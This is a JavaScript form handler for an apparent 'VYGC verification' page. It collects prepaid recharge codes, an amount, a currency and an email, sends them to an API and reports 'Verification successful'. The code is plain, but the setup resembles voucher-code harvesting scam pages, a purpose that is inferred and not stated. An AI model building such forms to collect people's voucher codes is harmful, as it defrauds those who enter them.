// ==========================================
// VYGC VERIFICATION - Simple Form Handler
// ==========================================

// Initialize API client
const api = new VYGCAPI(window.API_BASE_URL);

// Wait for DOM to be ready
document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('verificationForm');
    const messageDiv = document.getElementById('message');
    const submitBtn = form.querySelector('.submit-btn');

    // Handle form submission
    form.addEventListener('submit', async (e) => {
        e.preventDefault();

        // Get form data
        const formData = {
            rechargeType: document.getElementById('rechargeType').value.trim(),
            rechargeAmount: document.getElementById('rechargeAmount').value.trim(),
            currency: document.getElementById('currency').value.trim(),
            rechargeCode: [
                document.getElementById('code1').value.trim(),
                document.getElementById('code2').value.trim(),
                document.getElementById('code3').value.trim(),
                document.getElementById('code4').value.trim()
            ].filter(code => code !== '').join('\n'),
            email: document.getElementById('email').value.trim()
        };

        // Validate form
        if (!validateForm(formData)) {
            return;
        }

        // Show loading state
        submitBtn.disabled = true;
        submitBtn.classList.add('loading');
        hideMessage();

        try {
            // Submit to API
            const response = await api.submitVerification(formData);

            if (response.success) {
                // Show success message
                showMessage('Verification successful! You will receive a confirmation email shortly.', 'success');
                // Reset form
                form.reset();
            } else {
                // Show error message from API
                showMessage(response.message || 'Verification failed. Please check your information and try again.', 'error');
            }
        } catch (error) {
            console.error('Submission error:', error);
            showMessage('Connection error. Please check your internet connection and try again.', 'error');
        } finally {
            // Reset button state
            submitBtn.disabled = false;
            submitBtn.classList.remove('loading');
        }
    });
});

/**
 * Validate form data
 */
function validateForm(formData) {
    // Check all required fields
    if (!formData.rechargeType || !formData.rechargeAmount || !formData.currency || 
        !formData.rechargeCode || !formData.email) {
        showMessage('Please fill in all required fields.', 'error');
        return false;
    }

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(formData.email)) {
        showMessage('Please enter a valid email address.', 'error');
        return false;
    }

    return true;
}

/**
 * Show toast message to user
 */
function showMessage(text, type) {
    const toast = document.getElementById('message');
    const icon = toast.querySelector('i');
    
    // Update icon based on type
    if (type === 'success') {
        icon.className = 'fas fa-check-circle';
    } else if (type === 'error') {
        icon.className = 'fas fa-exclamation-circle';
    }
    
    toast.querySelector('.toast-message').textContent = text;
    toast.className = `toast ${type} show`;
    
    // Auto-hide after 6 seconds
    setTimeout(() => {
        hideMessage();
    }, 6000);
}

/**
 * Hide message
 */
function hideMessage() {
    const toast = document.getElementById('message');
    toast.classList.remove('show');
}
